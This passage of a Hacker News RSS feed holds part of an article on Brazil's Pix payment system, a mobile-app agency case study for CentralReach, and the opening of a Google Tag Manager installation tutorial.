<p>The study predicts that Pix will achieve mass adoption (i.e., be used for 25% of all household payments) within five years and move between 1 trillion reais ($200 billion) and 1.5 trillion reais ($300 billion) per year. That’s close to 20% of Brazil’s current GDP of 7.3 trillion reais ($1.46 trillion). “The Brazilian card industry, both debit and credit, moved 1.8 trillion reais ($360 billion) in 2019. So Pix can have practically that same size in 2025,” said Ricardo Pandur, payment specialist at Accenture.</p>



<p>But it remains to be seen who exactly will turn to Pix. The Central Bank is betting on its appeal to the <a href="https://www1.folha.uol.com.br/mercado/2020/10/pandemia-leva-a-bancarizacao-de-quase-10-milhoes-de-pessoas.shtml">36 million Brazilians</a> with no bank accounts. For them, Pix could serve as an entry point to financial services.</p>


<div>

<div>

<div>
<table>
<tbody>
<tr><td>Name:</td><td>Pix</td></tr>
<tr><td>Owner:</td><td>Brazil’s Central Bank</td></tr>
<tr><td>Start date:</td><td>November 16, 2020</td></tr>
<tr><td>Number of users expected by the end of first year:</td><td>30 million</td></tr>
<tr><td>Total payments processed (forecast):</td><td>$200 billion (R$1 trillion) by the end of 2025
</td></tr>
<tr><td>*Source:</td><td>Accenture</td></tr>
</tbody></table>
</div>
</div>
</div>


<div><p>For consumers, Pix will be an alternative to cash and debit cards, a cheap, fast method of money transfer, and even an easy way to pay taxes. For retailers, Pix will be cheaper than card operators, with potentially zero cost to them or their customers.</p><p>But access to Pix is conditional on access to a smartphone or a computer as well as a stable data connection. Even with increased connectivity and phone use, <a href="https://www.pewresearch.org/global/wp-content/uploads/sites/2/2019/02/Pew-Research-Center_Global-Technology-Use-2018_2019-02-05.pdf">40% of all Brazilian adults</a> still don’t have a smartphone. Potential users might have trouble understanding the system of personal keys and QR codes. “Understanding a payment mechanism is not as simple as learning to use social media,” said Ricardo Rocha, a professor of finance at Insper in São Paulo.</p></div>



<div><p>With new technology comes new vulnerabilities to scams and phishing attempts. Pix will be incorporated into banks’ native apps and websites and have the added benefit of encrypted transactions. But it will be up to the same banks to explain the risks while pushing for widespread adoption.</p><p>Some startups might have been pushing for adoption a little too far.&nbsp;Clients of online banks <a href="https://restofworld.org/2020/david-velez-nubank/">Nubank</a> and C6 and digital wallets PagSeguro and MercadoPago took to social media to complain that the companies registered their keys <a href="https://g1.globo.com/economia/noticia/2020/10/19/procon-notifica-nubank-e-mercado-pago-sobre-cadastramento-de-chaves-no-pix.ghtml">without their explicit consent</a>. The Central Bank started a <a href="https://exame.com/seu-dinheiro/bc-investiga-denuncia-de-cadastramento-indevido-das-chaves-do-pix/">formal investigation</a> and Brazil’s primary consumer defense entity <a href="https://g1.globo.com/economia/noticia/2020/10/19/procon-notifica-nubank-e-mercado-pago-sobre-cadastramento-de-chaves-no-pix.ghtml">questioned</a> their methods, but the corporations claimed they followed all guidelines and that their clients were notified via apps.</p></div>



<p>Even so, the future of Pix looks promising. Between October 5, when the Central Bank started to allow users to enroll their Pix keys ahead of the November launch date, and October 22, there have been 50 million enrollments. On the first day alone, 3.5 million keys entered the system, and the demand was so high that many banking apps crashed.</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cash-debit-or-pix/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942060</guid>
            <pubDate>Fri, 30 Oct 2020 13:40:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mobile Apps for US-Based Electronic Health Record Software Provider]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942018">thread link</a>) | @_Tata_
<br/>
October 30, 2020 | https://www.ego-cms.com/centralreach | <a href="https://web.archive.org/web/*/https://www.ego-cms.com/centralreach">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><h2>The process</h2><p>The first thing to consider when developing a healthcare app is <a href="https://www.hhs.gov/sites/default/files/ocr/privacy/hipaa/administrative/securityrule/techsafeguards.pdf" rel="nofollow" target="_blank"><span><strong>compliance with HIPAA security standards</strong></span></a><span>.</span> With our background in creating medical apps, we know how to combine HIPAA compliance, an emotional UI, and a smart UX into a handy app.</p></div><p>To make the development process more efficient, we used the <a href="https://visualstudio.microsoft.com/ru/xamarin/?rr=https%3A%2F%2Fmy.readymag.com%2Fedit%2F889974%2Fpreview%2F5%2F" rel="nofollow" target="_blank">Xamarin</a> cross-platform framework. Xamarin lets us deliver apps on two platforms quickly and cost-effectively.</p><p>We collaborated closely with CentralReach’s Lead Server Engineer and their web development team to convert tasks into designs and code. As a result, we developed iOS and Android apps that perfectly integrate with the CentralReach web application.</p><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team.png" sizes="(max-width: 767px) 88vw, (max-width: 991px) 94vw, 100vw" srcset="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team-p-500.png 500w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team-p-800.png 800w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team.png 1024w" alt=""></p><p>Our PM during a meeting with the CentralReach Team</p></div><div><p>We decided to start the design process with defining and building a core app structure and navigation. This strategy helped us create the app’s logic.</p></div></div></div><div><div><div><div><div><div data-w-id="7722f573-02ad-1641-54fe-1d32747c43e3"><div><p><strong><em>The application supports the fingerprint authentication feature for both iOS and Android</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>In-app navigation represented with the simple side drawer.</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>We integrated Google Maps for Android and Apple Maps for iOS devices to implement a route guidance feature.</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>In addition to being HIPAA-compliant, client data is further protected by a lockscreen feature. Users may also log out via lockscreen, in case the app is being used by several specialists within one organization</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>Modal View with different file options</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>To prevent the app from “hogging” all the memory on a device, services providers can decide for themselves how much space the app will use to store files and can control the storage level, conveniently in the app settings</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div></div></div></div></div></div></div><div><div><h2><strong>Wireframes</strong></h2><p>We started with sketches on paper. After discussing a lot of different concepts, we came up with high fidelity wireframes.</p></div></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dcf12b4a76d20253a856f_6_messags_wf.png" alt=""></p><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dd2c5358ee938831cce18_6_new_message_wf.png" alt=""></p></div><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567232"><p><em>Everything you need is in your hands. Track, manage, and plan your day with scheduling functionality.</em></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dd991b1d7895fc14f0da6_6_dashboard_wf.png" alt=""></p></div><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567238"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d30888f26763453d6ea2924_6_notes_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d3089bcc13cb6741a4bdf8f_6_add_lable_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf456723d"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308a84be811898d72d5438_6_map_wf.png" alt=""></p><p><strong><em>Service providers can easily get driving directions to their session locations.</em></strong></p></div><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567244"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308c3ec13cb6e62d4bec08_6_pin_code_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308d392676347329ea3e44_6_chat_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567249"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308dcb85ef61da385eb0bc_6_signature_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308eacc13cb6004a4bf8ab_6_settings_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf456724e"><p><em>Simple login that supports fingerprint authentication.</em></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308f57c13cb6f0c04bfd11_6_signin_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d3090a9b0d1302b2de24127_6_menu_wf.png" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d309144267634838cea5498_6_edit_location_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567258"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dd2c5358ee938831cce18_6_new_message_wf.png" alt=""></p></div></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dc69bb78ea802a0854413_phone.png" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dc69bb4a76db0ce3a5a81_6_app_animation_in_phone.gif" alt=""></p></div></div></div></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2.jpg" sizes="(max-width: 1800px) 100vw, 1800px" srcset="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2.jpg 1800w" alt=""></p><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c1474313d9a85005a91aa_9_pin_code.png" alt=""><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c1474e11fbe43926197e1_9_signature.png" alt=""><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c14747ec3662314bea542_9_lable.png" alt=""></p><div><div><h2><strong>Functionality</strong></h2><p>The CentralReach platform has a wide range of features, but we identified just three core features to include in the first version of the mobile app. This let us get initial user feedback before developing the remaining features. We’ve already implemented scheduling and messaging, and we’re planning to develop the file management system in the next iteration.</p></div><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d668a6bb072640aafc73144_Scheduling2.gif" alt=""></p><div data-w-id="d1f156ec-c5b8-93ad-fbf7-bd55568c57f3"><h2><strong>Scheduling</strong></h2><p>With the <strong>scheduling feature,</strong> service providers can organize their schedules from anywhere at any time using the built-in calendar.</p><p>Intuitive navigation allows service providers to easily access their scheduled appointments, see appointment details, change the date and time of appointments, and subsequently communicate those changes to clients. This ensures that clients and services providers are kept in sync in real-time through the app.</p></div></div></div><p>Each appointment is available on the home screen, allowing service providers and clients to easily view essential information including:</p><div><div data-w-id="062a8657-b820-edff-b4c7-9b7aa16f24db"><h2><strong>Messaging</strong></h2><p>To make conversations between service providers and clients easier and more convenient, we integrated secure real-time in-app messaging that’s <strong>HIPAA-compliant.</strong></p><p>At CentralReach’s request, we implemented an in-app messaging system using <a href="https://quickblox.com/" target="_blank"><strong>Quickblox</strong></a><strong>,</strong> which provided us with the infrastructure required for chat functionality. With in-app chat, service providers and patients no longer need to use third-party messaging apps. Their private conversations are secured within the app.</p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d668bde453152190f9c5dea_11_messages2.gif" alt=""></p></div><div data-w-id="41a2d73b-be20-40f9-b8f2-d17f25f09844"><div><h2><strong>File management system</strong></h2><p>This project is ongoing, and in the next version we’re planning to implement a feature that enables service providers to access files they need while they’re on the go, even without an internet connection. This file management system will allow service providers to:</p></div><div><div data-w-id="ed7bb160-c295-cfd2-068b-bbb565e9c96d"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c32007ec36600c7bf7ba6_12_icon_cloud_cross.png" alt=""></p><p><h3><strong>Access essential files in<br>offline mode</strong></h3></p></div><div data-w-id="ed7bb160-c295-cfd2-068b-bbb565e9c96e"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c3201e11fbe7615625f7b_12_icon_lock.png" alt=""></p><p><h3><strong>Control document accessibility (for example, mark as read-only)</strong></h3></p></div><div data-w-id="78e7c47c-c9db-f6de-981f-9aaf0b5a8140"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c3200e11fbe7f1c625f79_12_icon_folder.png" alt=""></p><p><h3><strong>Organize files and sort them <br>into folders</strong></h3></p></div></div><div><div data-w-id="c2f09bd3-612c-f089-d576-7f2f4bfe3137"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c32005c898042edbfa77a_12_icon_doc.png" alt=""></p><p><h3><strong>Work with a wide range of <br>file types</strong></h3></p></div><div data-w-id="c2f09bd3-612c-f089-d576-7f2f4bfe3140"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c3201e11fbe2643625f7a_12_icon_cloud.png" alt=""></p><p><h3><strong>Upload, share, and view files on<br>any device</strong></h3></p></div></div></div></div><div><div><p>CentralReach tested the waters by working on this project with us. We’ve <span><strong>successfully launched</strong></span> the first version of this app, and we’re continuing to build our project team and crank out amazing new features.</p></div></div><div><div><section><div data-ix="in-5-fade-300"><h2>We’re Sure You Have an Amazing Idea</h2><p>Let’s discuss how to bring it to life.</p><a href="https://www.ego-cms.com/contact-us" data-w-id="c66f8563-c48c-2b07-207c-728c2ca3b362"><p>CONTACT US</p></a></div></section></div></div></div></div>]]>
            </description>
            <link>https://www.ego-cms.com/centralreach</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942018</guid>
            <pubDate>Fri, 30 Oct 2020 13:35:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn setting up Google Tag Manager with this tutorial]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941974">thread link</a>) | @arctic-hunter
<br/>
October 30, 2020 | https://bluerivermountains.com/en/google-tag-manager-setup | <a href="https://web.archive.org/web/*/https://bluerivermountains.com/en/google-tag-manager-setup">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><main role="main"><div><figure><div></div></figure><p>As a <a href="https://bluerivermountains.com/en/google-tag-manager-consultant">Google Tag Manager consultant</a>, I've set up GTM on <b>100+ client websites</b>. This Google Tag Manager tutorial is where I teach you the process I've refined over the years, step by step, with examples and videos for you to learn.</p><p>Further down, you can <a href="https://bluerivermountains.com/en/google-tag-manager-setup#download-gtm-config-container-file">download a GTM setup configuration file</a> with all of the following best practices to import into your container.</p><p>If you can't wait, jump right into the <a href="https://bluerivermountains.com/en/google-tag-manager-setup#install-google-tag-manager-on-your-website">installation</a> tutorial or learn <a href="https://bluerivermountains.com/en/google-tag-manager-setup#how-to-set-up-google-tag-manager">how to set up Google Tag Manager</a>. But if you are a <b>beginner</b> it is important to first understand <em>how</em> to use a <a href="https://bluerivermountains.com/en/tag-management">tag management system</a> together with other tools.</p><p>So keep on reading below first.</p><h2 id="how-to-use-google-tag-manager"><a href="#how-to-use-google-tag-manager" aria-label="How to use Google Tag Manager?" title="Right click to copy link to paragraph"></a>How to use Google Tag Manager?</h2><p>I assume you already know <a href="https://bluerivermountains.com/en/what-is-google-tag-manager">what Google Tag Manager is</a>. So lets talk about how GTM works and how to use it.</p><p>Ideally, you only want to have <b>one</b> 3rd-party tag in the source code of your website or web app.</p><a href="https://twitter.com/intent/tweet?text=The%20only%203rd-party%20tag%20on%20your%20website%20should%20be%20the%20Google%20Tag%20Manager%20code%20snippet.%20-%20via%20undefined" target="_blank"><section><p><b>The only 3rd-party tag on your website should be the Google Tag Manager code snippet.</b></p><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>All other tags are then implemented through the tag manager itself. Other marketing and tracking tags are e.g. Google Analytics (GA), Facebook, Twitter, Linkedin, AdWords, DoubleClick and god knows what.</p><p>The primary reason are the <a href="https://bluerivermountains.com/en/google-tag-manager-benefits">advantages of Google Tag Manager</a>:</p><ul><li><b>easier &amp; faster</b> implementation of marketing tags</li><li>scalability on every page and across multiple domains</li><li><b>built-in triggers</b> for form submissions, scroll tracking&nbsp;&amp; video tracking</li><li>manage users with multiple gtm accounts</li><li>a bit <a rel="noopener" target="_blank" href="https://marketingland.com/audit-of-online-retailer-sites-shows-tag-management-systems-improve-load-times-reduce-errors-62173">faster site load speed</a></li></ul><p>Due to these advantages, already <a target="_blank" href="https://w3techs.com/technologies/overview/tag_manager">30% of all websites on the internet use a tag manager</a>. And among them Google Tag Manager has a market share of <a target="_blank" rel="noopener" href="https://trends.builtwith.com/analytics/tag-management/traffic/Entire-Internet">94%</a>.</p><p>So, unless you have a solid reason not to add a tag to GTM, as a general rule of thumb, <b>add all tags to the GTM container</b>.</p><a href="https://twitter.com/intent/tweet?text=Use%20GTM%20like%20a%20connecting%20layer%20between%20your%20website%20and%203rd-party%20tags.%20-%20via%20undefined" target="_blank"><section><p><b>Use GTM like a connecting layer between your website and 3rd-party tags.</b></p><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>Use GTM like a <b>middle-layer</b> between your website and 3rd-party services. Without it, your site and 3rd party tags are not in direct connection. Those services are mostly JavaScript libraries for marketing or tracking tools that are implemented with a tag. But any other tags apply as well.</p><p>The only exception to the rule applies when you do&nbsp;conversion optimization&nbsp;with split-testing tools.</p><p>Because during conversion rate optimization, A/B tests are going to load different variants of a page. So the visitor may see how the content is re-rendered for a split-second.</p><p>To avoid CSS flicker and ensure that variant tests load fast, a split-testing tag may also go directly into the source code.</p><p>Now that we have this out of the way, let’s look at the implementation.</p><h2 id="install-google-tag-manager-on-your-website"><a href="#install-google-tag-manager-on-your-website" aria-label="Install Google Tag Manager on your website" title="Right click to copy link to paragraph"></a>Install Google Tag Manager on your website</h2><p>Let's start the Google Tag Manager tutorial by showing you where to get the Google Tag Manager code snippet and then where to install it on the website. You can log in just by using your usual Google account.</p><ol><li><h3 id="create-a-google-tag-manager-account"><a href="#create-a-google-tag-manager-account" aria-label="Create a Google Tag Manager account" title="Right click to copy link to paragraph"></a>Create a Google Tag Manager account</h3>To install GTM, you first have to go to the <a rel="noopener" target="_blank" href="https://tagmanager.google.com/">official website</a> and create a new Google Tag Manager account.<br><figure><div></div><figcaption>First, create a Google Tag Manager account, and choose a container name, like your website name and then get the code snippet.</figcaption></figure></li><li><h3 id="create-a-web-property"><a href="#create-a-web-property" aria-label="Create a web-property" title="Right click to copy link to paragraph"></a>Create a web-property</h3>Select the <b>Web</b> property to get a code for a website or web app.<br><figure><div></div><figcaption>There are multiple types of containers available in a GTM account. For websites, choose web. Note that there are other tag manager container types for AMP pages, iOS and Android too.</figcaption></figure></li><li><h3 id="implement-the-google-tag-manager-code"><a href="#implement-the-google-tag-manager-code" aria-label="Implement the Google Tag Manager code" title="Right click to copy link to paragraph"></a>Implement the Google Tag Manager code</h3><ul>Afterwards, you will be shown the Google Tag Manager code to implement on your website.<br><figure><div></div><figcaption>This is the Google Tag Manager container tag. It has two parts. The instructions how to implement the script tags are written above each part.</figcaption></figure><li>Take the <b>first part</b> of the container tag and put it as high as possible in the <b>head</b> tag on every page of your website. This ensures that you can fire tags early during page loads.</li><li>The <b>second part</b> is an iframe to run in browsers that have JavaScript disabled. Install the tag as high as possible in the <b>body</b> tag on each page of your website.<br><figure><div></div><figcaption>The first tag in the &lt;head&gt; is a data layer. Don't worry if you don't know yet what that is (first arrow). Next is the first part of the GTM tag (second arrow). Finally, the other part of the GTM tag is implemented high up in the &lt;body&gt; element.  or JavaScript code can be implemented in between, but a data layer is always implemented before the GTM tag and the &lt;noscript&gt; GTM tag is always last.</figcaption></figure></li></ul></li></ol><p>This is the common method to implement GTM.</p><p>Do you use a popular content management system? If yes, you can also use a <b>plugin</b> that takes care of the Google Tag Manager installation.</p><p>That said:</p><a href="https://twitter.com/intent/tweet?text=If%20your%20CMS%20also%20offers%20you%20a%20plugin%20to%20install%20other%20tags,%20don%27t%20use%20yet%20another%20plugin%20to%20install%20Google%20Analytics,%20Facebook%20or%20Google%20Ads.%20Instead,%20use%20GTM%20to%20install%20those%20tags.%20-%20via%20undefined" target="_blank"><section type="info"><img 